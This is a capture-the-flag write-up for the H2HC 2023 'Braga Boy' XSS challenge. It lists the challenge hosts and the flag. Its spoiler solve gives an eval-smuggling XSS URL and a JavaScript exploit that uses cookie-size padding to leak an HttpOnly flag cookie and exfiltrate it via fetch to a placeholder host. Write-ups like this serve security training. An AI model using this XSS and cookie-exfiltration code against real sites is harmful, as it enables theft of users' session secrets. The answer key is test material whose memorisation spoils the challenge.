# Braga Boy

## Descrição

>Para dançar, isso aqui é (bomba)

>Para balançar, isso aqui é (bomba)

>Para mexer, isso aqui é (bomba)

- `http://default.xss.bragaboys.ctfh2hc2023.win:8081/index.php`
- `http://admin.xss.bragaboys.ctfh2hc2023.win:8081/index.php`
- `http://ip:8480/`

## Flag

`h2hc-ctf{big_p4dding_b3fore_cookie_b0mb_|<ills_http_0nly}`

## Portas

- Applicação: 8081
- Bot: 8480

## Solve
<details>
<summary>Spoiler</summary>

- XSS

```
http://default.xss.bragaboys.ctfh2hc2023.win:8081/index.php?nome=123%27&nome=%27,eval(location.hash.split(%27%23%27)[1]));function+dumbb_console(){};let%20a%20=(%27#alert()
```

- Exploit

```js
let flag="h2hc-ctf"
let padding_size = 0;
let found_begining = false;
let number_of_tries = 0;
let try_again = true;
let exfil_url = "http://yoururl:8081/"

async function exfil_flag(flag){
    console.log(`Exfiltrating ${flag} to ${exfil_url}`)
    await fetch(`${exfil_url}?cookie=${btoa(flag)}`, {mode: 'no-cors'})
}

async function get_flag(){
    console.log("Getting cookies")
    document.cookie = "flag" + "=" + "a".repeat(700) + "; path=/index.php; domain=.xss.bragaboys.ctfh2hc2023.win";
    while ( try_again == true){
        document.cookie = "flag" + "=" + "b".repeat(600) + "c".repeat(padding_size) + "; path=/;";

        var url = "http://default.xss.bragaboys.ctfh2hc2023.win:8081/index.php";

        var response = await fetch(url, {credentials: 'include'});
        var text = await response.text();
        cookie = text.split("...")[1].split("...")[0];
        if ( found_begining == false){
            if (cookie.includes("h2hc-ctf{")){
                console.log("found begining")
                found_begining = true;
                continue
            }
            console.log("Cookies:"+cookie);
            console.log("Adding more Padding length until found flag start" + padding_size)
            padding_size+=1;
        }
        else {
            console.log("adding padding until found end of flag")
            console.log("found", cookie.charAt(cookie.length - 2));
            console.log("Cookie", cookie);
            flag+=cookie.charAt(cookie.length - 2);
            console.log("Flag:"+flag)
            padding_size+=2;
        }
        if (cookie.includes("}")){
            console.log("found end")
            console.log("Flag:"+flag)
            await exfil_flag(flag);
            return
        }
        console.log("Cookies:"+cookie);
        number_of_tries+=1;
        if (number_of_tries > 500){
            try_again = false;
        }
    }
}
get_flag();
```
</details>
